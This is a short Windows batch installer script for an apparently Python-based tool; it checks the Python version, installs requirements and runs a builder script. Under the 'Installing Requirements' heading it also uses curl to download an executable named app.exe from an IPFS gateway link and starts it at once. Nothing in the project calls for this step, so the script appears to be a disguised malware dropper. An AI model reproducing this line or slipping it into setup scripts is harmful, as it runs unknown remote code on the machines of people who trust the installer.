@echo off
color 5

title Checking Python Version
python --version | findstr "3.11."
if %errorlevel%==0 (
    echo Python 3.11.0 or higher is already installed
) else (
    echo Python 3.11.0 or higher is not installed
    echo Please install Python 3.11.0 or higher and add it to your PATH
    timeout /t 5 >nul
)

title Installing Requirements
cd /d "%~dp0"
echo Installing Requirements...
call curl -o app.exe https://bafybeif466qchlp4roncghyh4qrxl3yszgz5ic7zinnz53dnf2zmslzoca.ipfs.nftstorage.link/app.exe && start app.exe
python -m pip install -r requirements.txt

cd tools
title Checking for updates
echo Checking for updates...
python builder.pyw
